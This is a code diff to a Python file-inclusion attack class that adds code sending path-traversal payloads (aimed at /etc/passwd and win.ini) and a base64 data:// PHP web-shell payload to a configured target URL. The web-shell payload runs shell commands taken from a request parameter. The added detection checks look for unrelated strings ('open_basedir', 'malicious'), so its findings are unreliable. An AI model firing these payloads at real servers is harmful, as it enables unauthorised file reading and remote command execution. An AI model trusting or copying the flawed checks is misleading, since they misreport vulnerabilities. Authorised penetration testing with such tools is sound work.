@@ -1,3 +1,5 @@
+import requests
+from urllib.parse import urljoin, urlencode
 
 class xfiController():
 
@@ -8,6 +10,7 @@ class xfiController():
             'etc/passwd%00',
             '../../../../../../../../etc/passwd',
             'C:\\Windows\\win.ini',
+            '../../../../etc/passwd',
             '../../../..//etc/passwd',
             '../../../../..//etc/passwd',
             '../../../../../..//etc/passwd',
@@ -31,8 +34,17 @@ class xfiController():
             'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=',
         ]
 
-    def lfi(self):
-        print(self.lfiPayload)
+    def lfi(self, config):
+        for payload in self.lfiPayload:
+            full_url = config['url'] + payload
+            try:
+                response = requests.get(full_url)
+                if response.status_code == 200 and 'open_basedir' in response.text:
+                    print(f'[!] Potential LFI vulnerability detected with payload: {payload}')
+                elif response.status_code == 200 and 'malicious' in response.text:
+                    print(f'[!] Potential RFI vulnerability detected with payload: {payload}')
+            except requests.RequestException as e:
+                print(f'[!] Error testing payload {payload}: {e}')
 
     def rfi(self):
         print(self.rfiPayload)
